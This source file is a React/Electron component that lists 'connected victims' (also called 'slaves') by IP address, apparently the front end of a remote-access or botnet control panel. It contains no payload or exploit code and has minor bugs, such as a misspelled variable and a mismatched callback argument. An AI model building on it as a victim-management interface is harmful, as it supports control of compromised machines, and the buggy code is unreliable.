import React from "react";
import ContextMenu from "./contextmenu";
import VicBox from "./body/vicBox";

export default class Body extends React.Component{
    constructor(){
        super();
        this.state = {
            ContextMenu: {
                options: {
                    1: [{ text: "hello", icon: "fav", action: this.testing.bind(this) }, { text: "2 hello", icon: "gear", action: this.testing.bind(this)}],
                    2: [{ text: "numm 2", icon: "start", action: null }],
                },
                selected: null,
                renderContext : false,
                clientX: 0,
                clientY: 0
            },
            ServerConstants : null,
            ConnectedGuests : {}
        }

        this.getVictims();
    }

    getVictims(){
        ipcRenderer.on("envVarResponse", (e, serverConstant) => {
            let ServerConstants = this.state.ServerConstants;
            ServerConstants = serverConstant;
            // update state so we can use it in this.ServerStore bellow
            this.setState({ServerConstants});
            let cl = (e, slaves) => {
                console.log("slaves:", slaves, "Constants:", ServerConstants);
                let ConnectedGuests = this.state.ConnectedGuests;
                ConnectedGuests = slaves;
                this.setState({ConnectedGuests});
            }
            // intial data pull
            this.ServerStore({
                method: "get",
                params: [this.state.ServerConstants.connectedVictims],
                id: "GetConnected",
                callback: cl
            });
            // data monitor 
            this.ServerStore({
                on : true,
                name: { variable: this.state.ServerConstants.connectedVictims, status : "UPDATED"},
                id: "monitor",
                callback: cl
            });
            // Server Constants monitor
            this.ServerStore({
                on: true,
                name: { variable: "Constants", status: "UPDATED" },
                id: "monitor",
                callback: (e, con) => this.setState({ServerConstants : con})
            });
        });
        ipcRenderer.send("getEnvVars", "ServerConstants");
        
    }

    ServerStore({method = null, params = [], on = null, name = null, callback = null, id = null}){
        if(!callback){
            throw new Error("Callback needed for ServerStore");
            return;
        }

        let listener = on;
        if(on != null)
            if (typeof on == "object")
                lisntener = on.hasOwnProperty("on") ? on.on : null;

        if (listener == true && name) {
            console.log("on event lisntener");
            // event listener
            let responseChannel = `ServerStoreResponse-on@${name}`;
            if (id) {
                if (typeof id == "string") {
                    responseChannel = `ServerStore-on#${id}`;
                } else if (typeof id == "object" && id.full == true) {
                    responseChannel = id.id;
                }
            }
            let cl = (e, r) => {
                callback(e, r);

                if(on.hasOwnProperty("once") && on.once == true) // one time listener
                    ipcRenderer.removeListener(responseChannel, cl);
            }
            ipcRenderer.on(responseChannel, cl);
            ipcRenderer.send("ServerStore-on", name, id);

        } else if(method && params){
            // regular method call
            console.log("one time event");
            let responseChannel = `ServerStoreResponse@${method}`;
            if (id) {
                if (typeof id == "string") {
                    responseChannel = `ServerStore#${id}`;
                } else if (typeof id == "object" && id.full == true) {
                    responseChannel = id.id;
                }
            }
            let cl = (e, r) => {
                callback(e, r);
                ipcRenderer.removeListener(responseChannel, cl);
            }
            ipcRenderer.on(responseChannel, cl);
            ipcRenderer.send("ServerStore", method, params ,id);
        }
    }

    ServerAction({method = null, params = [], id = null, callback = null}){
        if(method && params){
            if (!callback) {
                throw new Error("Callback needed for ServerAction");
                return;
            }
            let responseChannel = `ServerActionResponse@${method}`;
            if (id) {
                if (typeof id == "string") {
                    responseChannel = `ServerAction#${id}`;
                } else if (typeof id == "object" && id.full == true) {
                    responseChannel = id.id;
                }
            }
            let cl = (e, rse) => {
                callback(res, e);
                ipcRenderer.removeListener(responseChannel, cl);
            }
            ipcRenderer.on(responseChannel, cl );
            ipcRenderer.send("ServerAction", method, params);
        }else{
            throw new Error("method name and parameter is expected in ServerAction");
            return;
        }

    }

    removeContext(e){
        this.setState({
            ContextMenu: {
                renderContext: false,
                clientX: 0,
                clientY: 0,
                options: this.state.ContextMenu.options,
                selected: null
            }
        });
    }
    
    handleContext(e, id){
        let clientX = e.clientX, clientY = e.clientY;
       this.setState({
           ContextMenu: {
               renderContext: !this.state.ContextMenu.renderContext,
               clientX,
               clientY,
               options: this.state.ContextMenu.options,
               selected: id
           }
        });
        const ContextElement = e.target;
        this.ContextElement = ContextElement;
    }

    currentOption(){
        return this.state.ContextMenu.selected == null ? null : this.state.ContextMenu.options[this.state.ContextMenu.selected];
    }

    testing(element){
        alert("clicked");
    }


    render(){
        let currentOption = this.currentOption();
        console.log("Constants:", this.state.ServerConstants);
        let viewVictims = () => {
            let re = [];
            for (let ip in this.state.ConnectedGuests) {
                re.push(<VicBox key={ip}
                    ContextHandler={(event) => this.handleContext(event, 1)}
                    Text={ip} Attributes={{}} info={this.state.ConnectedGuests[ip]} />);
            }
            return re;
        }
        return(
            <div className="body" onClick={this.removeContext.bind(this)}>

                {this.state.ContextMenu.renderContext ? 
                <ContextMenu 
                    pos={{ clientX: this.state.ContextMenu.clientX, clientY: this.state.ContextMenu.clientY }} 
                        srcElm={this.ContextElement} options={currentOption} /> : null}

                {Object.keys(this.state.ConnectedGuests).length > 0 ? viewVictims() : <h1>No Guests </h1>}
                    
            </div>
        )
    }
}